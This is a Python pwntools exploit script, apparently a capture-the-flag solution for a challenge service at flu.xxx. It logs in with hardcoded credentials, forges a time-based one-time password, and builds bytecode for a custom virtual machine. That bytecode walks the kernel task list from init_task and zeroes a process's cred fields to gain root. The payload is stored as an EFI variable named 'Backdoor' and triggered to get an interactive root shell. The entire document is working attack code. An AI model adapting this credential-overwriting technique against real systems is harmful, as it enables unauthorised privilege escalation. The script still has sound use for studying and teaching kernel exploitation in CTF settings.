#!/usr/bin/env python3
from pwn import *
import datetime

BINARY = "./run-qemu.sh"
# BINARY = "./run-qemu-debug.sh"
HOST = "flu.xxx"
PORT = 2030

def conn(log_level="info"):
    if len(sys.argv) > 1:
        r = remote(HOST, PORT, level=log_level)
    else:
        r = process(BINARY, aslr=0, level=log_level)
    return r

r = conn()

r.sendlineafter("Username:", "admin")
r.sendlineafter("Password:", "superSecretPassword123")

now = datetime.datetime.utcnow()
YEAR = now.year
MONTH = now.month
DAY = now.day
HOUR = now.hour
MINUTE = now.minute

cotp  = ((1)<<32)|(MONTH<<24)|(DAY<<16)|(HOUR<<8)|(MINUTE)
cotp2 = ((YEAR-1)<<32)

def swap64(i):
    return struct.unpack("<Q", struct.pack(">Q", i))[0]

r.sendlineafter("Password:", f"{cotp:016x}-{swap64(cotp2):016x}")

def mov_r9_mem_r8():
    return b"\x00"
def mov_mem_r8_r9():
    return b"\x01"
def mov_rbx_mem_r8():
    return b"\x02"
def mov_mem_r8_rbx():
    return b"\x03"
def set_r9(target):
    return b"\x04" + p64(target)
def set_r8(target):
    return b"\x05" + p64(target)
def mov_r8_r9():
    return b"\x06"
def add_r8_r9():
    return b"\x07"
def jump(target):
    return b"\x08" + p64(target)
def je_val_r9(value, target):
    return b"\x09" + p64(value) + p64(target)

def save(name, data):
    r.sendlineafter("access", "save")
    r.sendlineafter("Name:", name)
    r.sendlineafter("Data:", repr(data)[2:-1])

def read64(addr, regs):
    if addr == None:
        payload = b""
    else:
        payload  = set_r8(addr)
    if regs == "r9":
        payload += mov_r9_mem_r8()
    elif regs == "rbx":
        payload += mov_rbx_mem_r8()
    return payload

init_task = 0xffffffff81a224c0
offset_tasks = 464
offset_pid = 632
offset_cred = 960

payload  = set_r8(init_task)

payload += set_r9(offset_tasks + 8)
payload += add_r8_r9()
payload += read64(None, "r9")
payload += mov_r8_r9() # init_tasks->tasks->prev

payload += set_r9(8)
payload += add_r8_r9()
payload += read64(None, "r9") # init_tasks->tasks->prev->prev
payload += mov_r8_r9()

payload += set_r9(offset_cred - offset_tasks)
payload += add_r8_r9() # (init_tasks->tasks->prev->prev)->cred
payload += read64(None, "r9")
payload += mov_r8_r9()

# patch creds
payload += set_r9(2)
payload += mov_mem_r8_r9()

payload += set_r9(8)
payload += add_r8_r9()
payload += set_r9(0)
payload += mov_mem_r8_r9()

payload += set_r9(8)
payload += add_r8_r9()
payload += set_r9(0)
payload += mov_mem_r8_r9()

payload += set_r9(8)
payload += add_r8_r9()
payload += set_r9(0)
payload += mov_mem_r8_r9()

payload += set_r9(8)
payload += add_r8_r9()
payload += set_r9(0)
payload += mov_mem_r8_r9()
payload += read64(None, "rbx")

save("Backdoor", payload)

r.sendlineafter("access", "shell")
r.sendlineafter("$ ", "efivar-static -p --name '13371337-1337-1337-1337-133713371337-Backdoor'")

r.interactive()